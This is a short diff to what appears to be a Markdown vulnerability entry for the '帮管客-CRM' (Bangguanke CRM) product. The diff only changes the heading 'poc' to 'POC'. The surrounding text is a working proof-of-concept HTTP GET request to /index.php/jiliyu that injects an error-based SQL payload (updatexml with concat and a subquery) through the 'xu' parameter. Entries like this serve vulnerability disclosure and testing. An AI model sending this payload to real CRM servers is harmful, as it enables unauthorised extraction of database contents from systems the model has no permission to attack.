@@ -7,7 +7,7 @@
 "帮管客-CRM"
 ```
 
-## poc
+## POC
 ```
 GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1)) HTTP/1.1
 Host: 127.0.0.1
